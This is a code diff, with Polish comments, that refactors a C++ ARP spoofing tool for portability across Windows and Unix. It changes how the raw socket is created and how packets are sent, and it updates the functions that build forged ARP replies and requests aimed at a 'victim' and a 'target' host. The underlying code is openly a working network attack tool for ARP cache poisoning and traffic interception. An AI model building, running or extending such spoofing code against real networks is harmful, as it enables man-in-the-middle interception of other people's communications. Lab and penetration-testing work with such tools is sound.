@@ -1,8 +1,17 @@
 #include "ArpSpoofer.hpp"
-#include "NetworkUtils.hpp"
+#include "PlatformAbstraction.hpp"
+#include "NetworkHeaders.hpp"
+#include <cstring>
+#include <cstdint>
+#include <algorithm>
+#include <iterator>
+#ifdef _WIN32
+#include <winsock2.h>
+#else
+#include <arpa/inet.h>
+#endif
 #include <iostream>
 #include <chrono>
-#include <cstring>
 
 ////////////////////////////////////////////////////////////
 ArpSpoofer::ArpSpoofer(const IPAddress& victimIp, const IPAddress& targetIp, bool oneWayMode)
@@ -17,7 +26,7 @@ ArpSpoofer::ArpSpoofer(const IPAddress& victimIp, const IPAddress& targetIp, boo
 	std::memset(myMac, 0, 6);
 	
 	// Utwórz raw socket
-	socket = std::make_unique<RawSocket>();
+	socket = PlatformFactory::createRawSocket();
 }
 
 ////////////////////////////////////////////////////////////
@@ -57,7 +66,7 @@ bool ArpSpoofer::start() {
 		return false;
 	}
 	
-	if (!socket->open()) {
+	if (!socket->open("", true)) {
 		log("Nie udało się otworzyć raw socket");
 		return false;
 	}
@@ -130,12 +139,13 @@ bool ArpSpoofer::sendArpReply(const IPAddress& targetIp, const uint8_t targetMac
 	arp->opcode = htons(2); // ARP Reply
 	
 	std::memcpy(arp->sender_mac, myMac, 6);
-	std::memcpy(arp->sender_ip, spoofedIp.data(), 4);
+	std::memcpy(arp->sender_ip, spoofedIp.toBytes().data(), 4);
 	std::memcpy(arp->target_mac, targetMac, 6);
-	std::memcpy(arp->target_ip, targetIp.data(), 4);
+	std::memcpy(arp->target_ip, targetIp.toBytes().data(), 4);
 	
 	// Wyślij pakiet
-	return socket->send(packet, sizeof(packet));
+	std::vector<uint8_t> packetVec(packet, packet + 42);
+	return socket->sendPacket(packetVec);
 }
 
 ////////////////////////////////////////////////////////////
@@ -164,10 +174,11 @@ bool ArpSpoofer::sendArpRequest(const IPAddress& targetIp) {
 	std::memcpy(arp->sender_mac, myMac, 6);
 	// sender_ip zostanie ustawione przez użytkownika
 	std::memset(arp->target_mac, 0, 6);
-	std::memcpy(arp->target_ip, targetIp.data(), 4);
+	std::memcpy(arp->target_ip, targetIp.toBytes().data(), 4);
 	
 	// Wyślij pakiet
-	return socket->send(packet, sizeof(packet));
+	std::vector<uint8_t> packetVec(packet, packet + 42);
+	return socket->sendPacket(packetVec);
 }
 
 ////////////////////////////////////////////////////////////
@@ -205,9 +216,9 @@ bool ArpSpoofer::isReady() const {
 	}
 	
 	// Sprawdź czy mamy wszystkie wymagane adresy MAC
-	bool hasVictimMac = std::any_of(victimMac, victimMac + 6, [](uint8_t b) { return b != 0; });
-	bool hasTargetMac = std::any_of(targetMac, targetMac + 6, [](uint8_t b) { return b != 0; });
-	bool hasMyMac = std::any_of(myMac, myMac + 6, [](uint8_t b) { return b != 0; });
+	bool hasVictimMac = std::any_of(std::begin(victimMac), std::end(victimMac), [](uint8_t b) { return b != 0; });
+	bool hasTargetMac = std::any_of(std::begin(targetMac), std::end(targetMac), [](uint8_t b) { return b != 0; });
+	bool hasMyMac = std::any_of(std::begin(myMac), std::end(myMac), [](uint8_t b) { return b != 0; });
 	
 	return hasVictimMac && hasTargetMac && hasMyMac;
 } 
